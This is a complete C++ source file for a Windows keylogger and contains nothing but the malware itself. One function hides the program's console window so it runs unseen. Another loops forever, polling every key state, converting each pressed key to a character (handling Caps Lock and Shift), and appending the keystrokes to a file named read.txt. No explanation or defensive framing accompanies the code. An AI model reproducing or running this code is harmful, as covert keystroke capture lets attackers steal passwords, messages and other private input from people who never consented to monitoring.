#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void Hide() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
void KeyLogging() {
	
	for (;;) {

		for (char c = 8; c <= 222; c++) {
			if (GetAsyncKeyState(c) & 0x0001) {
				ofstream insertFile("read.txt", ios::app);
				if (c > 64 && c < 91) {
					if (GetKeyState(VK_CAPITAL) == 0) 
						insertFile << char(c + 32);
					
					else 
						insertFile << c;
				}
				else if (c == 48) {
					if (GetAsyncKeyState(VK_SHIFT)) 
						insertFile << "=";
					else 
						insertFile << "0";
					
				}
				else if (c == 49) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "!";
					else
						insertFile << "1";
				}
				
				else if (c == 50) {
					if (GetAsyncKeyState(VK_SHIFT)) 
						insertFile << "\"";
					else
						insertFile << "2";
				}

				else if (c == 51) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "#";
					else
						insertFile << "3";
				}

				else if (c == 52) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "$";
					else
						insertFile << "4";
				}

				else if (c == 53) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "%";
					else
						insertFile << "5";
				}

				else if (c == 54) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "&";
					else
						insertFile << "6";
				}

				else if (c == 55){
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "/";
					else
						insertFile << "7";
				}

				else if (c == 56) {
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << "(";
					else
						insertFile << "8";
				}

				else if (c == 57){
					if (GetAsyncKeyState(VK_SHIFT))
						insertFile << ")";
					else
						insertFile << "9";
				}
				else if (GetAsyncKeyState(VK_SPACE))
					insertFile << ' ';
				else if (GetAsyncKeyState(VK_BACK))
					insertFile << "[BACK]";
				else if (GetAsyncKeyState(VK_RETURN)) {
					insertFile << "[ENTER]";
					insertFile << "\n";
				}
				else if (GetAsyncKeyState(VK_LEFT))
					insertFile << "[LEFT]";
				else if (GetAsyncKeyState(VK_RIGHT))
					insertFile << "[RIGHT]";
				else if (GetAsyncKeyState(VK_UP))
					insertFile << "[UP]";
				else if (GetAsyncKeyState(VK_DOWN))
					insertFile << "[DOWN]";
				else if (GetAsyncKeyState(VK_SHIFT))
					insertFile << "[SHIFT]";
				else if (GetAsyncKeyState(VK_CONTROL))
					insertFile << "[CTRL]";
				else if (GetAsyncKeyState(VK_MENU))
					insertFile << "[ALT]";
				else if (GetAsyncKeyState(VK_TAB))
					insertFile << "[TAB]";
				else if (GetAsyncKeyState(VK_NUMPAD0))
					insertFile << "0";
				else if (GetAsyncKeyState(VK_NUMPAD1))
					insertFile << "1";
				else if (GetAsyncKeyState(VK_NUMPAD2))
					insertFile << "2";
				else if (GetAsyncKeyState(VK_NUMPAD3))
					insertFile << "3";
				else if (GetAsyncKeyState(VK_NUMPAD4))
					insertFile << "4";
				else if (GetAsyncKeyState(VK_NUMPAD5))
					insertFile << "5";
				else if (GetAsyncKeyState(VK_NUMPAD6))
					insertFile << "6";
				else if (GetAsyncKeyState(VK_NUMPAD7))
					insertFile << "7";
				else if (GetAsyncKeyState(VK_NUMPAD8))
					insertFile << "8";
				else if (GetAsyncKeyState(VK_NUMPAD9))
					insertFile << "9";
				else if (GetAsyncKeyState(VK_MULTIPLY))
					insertFile << "*";
				else if (GetAsyncKeyState(VK_ADD))
					insertFile << "+";
				else if (GetAsyncKeyState(VK_SUBTRACT))
					insertFile << "-";
				else if (GetAsyncKeyState(VK_DIVIDE))
					insertFile << "/";
				else if (GetAsyncKeyState(110))
					insertFile << ".";
			}
		}
	}
}

int main() {
	
	Hide();
	KeyLogging();

	return 0;
}
